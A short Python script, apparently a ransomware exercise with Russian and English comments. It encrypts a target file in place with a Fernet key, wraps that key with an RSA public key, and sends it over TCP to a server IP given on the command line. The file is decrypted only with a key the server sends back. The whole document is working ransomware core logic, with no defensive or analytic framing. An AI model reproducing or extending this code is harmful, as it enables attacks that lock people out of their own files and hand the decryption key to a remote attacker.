from genericpath import exists
import socket
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

# argv[1] - ip address of TCP Server
# argv[2] - file of public RSA key
# argv[3] - target file to encoding and decoding

# Generate symmetric key
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)
targetfile = sys.argv[3]

server_ip, server_port = sys.argv[1], 8000
def sendEncryptedKey(e_key_filepath):
    with socket.create_connection((server_ip, server_port)) as sock:
        with open(e_key_filepath, "rb") as file:
            sock.send(file.read())
        return sock

def decrypt_file(filepath, key):
    f_instance = Fernet(key)
    with open(filepath, "rb") as file:
        decrypted_data = f_instance.decrypt(file.read())
    
    with open(filepath, "wb") as file:
        file.write(decrypted_data)


# Получение публичного ключа для ассиметричного шифрования
public_key_path = sys.argv[2]
if exists(public_key_path):
    with open(public_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
else:
    print("public key dousn\'t exist")
    quit()

# Шифрование симметричного ключа ассиметричным, используя публичный ключ
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Write to the new or overrite existing file an encrypted symmetric key
encrypted_filepath = "encrypted_key.bin"
with open(encrypted_filepath, "wb") as key_file:
    key_file.write(encryptedSymmetricKey)
    
# Encrypt the target file
with open(targetfile, "rb") as file:
    file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)

with open(targetfile, "wb") as file:
    file.write(encrypted_data)

socket = sendEncryptedKey(encrypted_filepath)
decrypted_key = socket.recv(4056).strip()
decrypt_file(targetfile, decrypted_key)
quit()